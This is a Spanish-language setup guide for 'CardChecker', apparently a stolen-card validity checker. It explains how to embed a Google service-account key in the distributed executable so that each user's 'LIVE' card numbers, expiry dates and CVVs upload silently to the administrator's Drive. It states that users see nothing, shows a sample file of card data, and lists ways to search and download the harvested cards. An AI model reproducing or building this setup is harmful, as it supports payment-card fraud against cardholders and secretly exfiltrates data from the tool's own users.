# Configuración de Google Drive para CardChecker (Service Account)

Esta guía explica cómo habilitar la subida automática de resultados LIVE a **TU Google Drive** desde todas las apps de tus usuarios, sin que ellos tengan que autenticar.

## 🎯 ¿Cómo funciona?

- Todos los usuarios suben a **TU Drive** automáticamente
- No necesitan autenticar ni tener cuenta de Google
- Tú ves todas las tarjetas LIVE organizadas por licencia
- Completamente transparente para el usuario

## ⚠️ Requisitos (solo tú como admin)

```bash
pip install google-auth google-auth-oauthlib google-auth-httplib2 google-api-python-client
```

## 📋 Configuración (una sola vez - solo tú)

### 1. Crear proyecto en Google Cloud Console

1. Ve a: https://console.cloud.google.com/
2. Crea un nuevo proyecto: "CardChecker"
3. Selecciona el proyecto

### 2. Habilitar Google Drive API

1. Menú lateral: **APIs y servicios** → **Biblioteca**
2. Busca: "Google Drive API"
3. Click **Habilitar**

### 3. Crear Service Account

1. **APIs y servicios** → **Credenciales**
2. **+ Crear credenciales** → **Cuenta de servicio**
3. Detalles:
   - Nombre: `CardChecker Service`
   - ID: `cardchecker-service` (se genera automático)
   - Click **Crear y continuar**
4. Rol: **NO AGREGAR NINGÚN ROL** → Click **Continuar**
5. Click **Listo**

### 4. Generar clave JSON

1. En la lista de cuentas de servicio, click en la que acabas de crear
2. Pestaña **Claves**
3. **Agregar clave** → **Crear clave nueva**
4. Tipo: **JSON**
5. Click **Crear**
6. Se descargará `cardchecker-service-xxxxx.json`

### 5. Compartir carpeta de Drive con el Service Account

1. Abre tu Google Drive
2. Crea una carpeta llamada **"CardChecker"** (o usa una existente)
3. Click derecho → **Compartir**
4. En el campo de email, pega el email del service account:
   - Lo encuentras en el JSON descargado, campo `client_email`
   - Ejemplo: `cardchecker-service@cardchecker-123456.iam.gserviceaccount.com`
5. Dale permisos de **Editor**
6. **Desmarcar** "Notificar a las personas"
7. Click **Compartir**

### 6. Configurar CardChecker

1. Renombra el JSON descargado a: `gdrive_service_account.json`
2. Coloca el archivo junto a `CardChecker.exe`:
   ```
   dist/
     ├─ CardChecker.exe
     └─ gdrive_service_account.json  ← AQUÍ
   ```
3. Listo, ya funciona para todos los usuarios

## 🚀 Uso automático

No hay nada que configurar para los usuarios. Al distribuir:

1. Envías `CardChecker.exe` + `gdrive_service_account.json` juntos
2. Usuario ejecuta la app
3. Procesa tarjetas
4. Al finalizar: **automáticamente sube LIVE a TU Drive**
5. Usuario no ve nada, es transparente

## 📁 Estructura en TU Drive

```
Google Drive/
  └─ CardChecker/  ← carpeta compartida con el service account
      ├─ CCR-0001-A1B2/
      │   ├─ live_cards_2026-09-22_15-30-45.txt
      │   └─ live_cvv_invalid_2026-09-22_15-30-45.txt
      │
      ├─ CCR-0002-C3D4/
      │   └─ live_cards_2026-09-23_10-15-20.txt
      │
      └─ CCR-0003-E5F6/
          └─ live_cards_2026-09-24_08-45-10.txt
```

Cada archivo contiene:
```
========================================
  LIVE - CVV Válido
========================================
Licencia: CCR-0001-A1B2
Fecha: 2026-09-22 15:30:45
Total: 5 tarjeta(s)
========================================

4532123456789012|12|2027|123
5412345678901234|06|2028|456
...
```

## 🔧 Desactivar subida automática

Si no quieres usar Google Drive:
- Simplemente NO incluyas `gdrive_service_account.json` al distribuir
- La app funcionará normal sin subir a Drive

## ⚠️ Seguridad

- **NUNCA** compartas el archivo `gdrive_service_account.json` públicamente
- Solo compártelo con tus usuarios de confianza
- Si se filtra: elimina el service account y crea uno nuevo
- Puedes revocar acceso desde Google Cloud Console

## 🆘 Solución de problemas

**Error: "google.auth not found"**
```bash
pip install google-auth google-auth-oauthlib google-auth-httplib2 google-api-python-client
```

**Error: "gdrive_service_account.json not found"**
- Verifica que el archivo esté junto a `CardChecker.exe`

**Error: "Permission denied"**
- Verifica que compartiste la carpeta "CardChecker" con el email del service account
- Revisa que tiene permisos de **Editor**, no solo **Lector**

**No se sube nada**
- Verifica que haya tarjetas LIVE en los resultados
- Revisa los logs en la app
- Verifica que el JSON sea válido (ábrelo con un editor de texto)

## 📊 Monitoreo

Desde TU Google Drive puedes:
- Ver todas las tarjetas LIVE de todos tus usuarios
- Filtrar por licencia (cada carpeta es una licencia)
- Descargar archivos para análisis
- Buscar tarjetas específicas
- Ver historial por fechas
